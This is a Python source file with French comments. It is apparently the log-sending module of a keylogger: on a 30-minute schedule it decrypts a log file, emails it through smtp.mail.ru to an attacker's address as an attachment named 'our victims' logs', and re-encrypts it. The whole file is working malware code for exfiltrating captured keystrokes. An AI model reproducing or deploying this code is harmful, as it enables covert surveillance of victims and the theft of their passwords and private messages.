"""FICHIER POUR L'ENVOI DE LOGS PAR COURRIEL"""
import os
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import schedule
from decryption import main_dcrp
from encryption import main_ecrp


# fonction d'envoi d'email
def envoyer_courriel(chemin_fichier):

    # expéditeur
    expediteur = "VOTRE COURRIEL"
    mot_de_passe = "CODE D'APPLICATION"
    # destinataire
    destinataire = "COURRIEL DU DESTINATAIRE"

    # serveur SMTP
    serveur = smtplib.SMTP('smtp.mail.ru', 587)
    serveur.starttls()
    serveur.login(expediteur, mot_de_passe)

    main_dcrp()

    msg = MIMEMultipart()
    msg['Sujet'] = "keyloger"
    msg['De'] = expediteur
    msg['À'] = destinataire

    # joindre un message texte
    msg.attach(MIMEText("Voir pièce jointe pour les logs.", 'plain'))

    # gestionnaire d'erreurs
    try:

        # ouvrir le fichier et l'ajouter comme pièce jointe
        with open(chemin_fichier, "rb") as fichier:
            partie = MIMEApplication(fichier.read())
            partie.add_header('Content-Disposition', 'attachment', filename="nos_logs_victimes")
            msg.attach(partie)
            print('Fichier envoyé avec succès!')

    except FileNotFoundError:     # si le fichier n'est pas trouvé
        print(f'Fichier {chemin_fichier} non trouvé')

    serveur.sendmail(expediteur, destinataire, msg.as_string())
    main_ecrp()
    serveur.quit()
    # os.remove(chemin_fichier)


# fonction d'exécution du planning
def executer_planning(chemin_fichier):
    schedule.every(30).minutes.do(envoyer_courriel, chemin_fichier)

    while True:
        schedule.run_pending()
        time.sleep(1)


def main():
    # chemin du fichier de logs
    nom_fichier = 'system_monitoring.txt'
    repertoire_courant = os.path.dirname(os.path.abspath(__file__))
    chemin_fichier = os.path.join(repertoire_courant, nom_fichier)

    # lancement de l'exécution du planning
    executer_planning(chemin_fichier)
